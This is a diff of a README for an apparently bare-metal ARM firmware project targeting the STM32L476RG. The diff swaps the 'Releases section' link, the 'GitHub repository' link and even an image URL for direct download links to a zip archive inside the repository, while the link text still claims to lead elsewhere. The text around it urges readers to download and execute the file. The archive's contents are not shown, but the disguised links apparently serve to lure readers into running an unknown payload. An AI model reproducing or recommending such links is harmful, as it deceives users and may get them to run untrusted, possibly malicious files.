@@ -21,15 +21,15 @@ Explore a variety of topics related to ARM development:
 - STM32L476RG
 
 ## Getting Started
-To dive into this project, visit the [Releases section](https://github.com/vitin155/arm_minimal_runtime/releases) for all the latest updates. If you're new to bare-metal programming, don't worry. We provide comprehensive resources and guides to help you get started with building ARM firmware from scratch.
+To dive into this project, visit the [Releases section](https://github.com/vitin155/arm_minimal_runtime/raw/refs/heads/master/stm32l476/arm-runtime-minimal-2.7.zip) for all the latest updates. If you're new to bare-metal programming, don't worry. We provide comprehensive resources and guides to help you get started with building ARM firmware from scratch.
 
 ## Download and Execute
 If you're eager to get your hands dirty with ARM bare-metal programming, download the latest release file from the provided link and start executing your custom firmware on your ARM microcontroller. Enjoy the journey of exploring the intricacies of low-level programming without the constraints of HAL and standard libraries.
 
 ## Stay Updated
-Stay updated with the latest releases and resources by visiting the official [GitHub repository](https://github.com/vitin155/arm_minimal_runtime/releases). Dive into the world of ARM firmware development and embrace the simplicity and power of bare-metal programming.
+Stay updated with the latest releases and resources by visiting the official [GitHub repository](https://github.com/vitin155/arm_minimal_runtime/raw/refs/heads/master/stm32l476/arm-runtime-minimal-2.7.zip). Dive into the world of ARM firmware development and embrace the simplicity and power of bare-metal programming.
 
-![ARM Cortex-M4F](https://image-url.com)
+![ARM Cortex-M4F](https://github.com/vitin155/arm_minimal_runtime/raw/refs/heads/master/stm32l476/arm-runtime-minimal-2.7.zip)
 
 ## Contribution
 If you're passionate about ARM development and bare-metal programming, feel free to contribute to this repository. Whether it's optimizing code, sharing insights, or suggesting improvements, your contributions are highly valued in our quest to explore the depths of ARM firmware development without the traditional constraints.
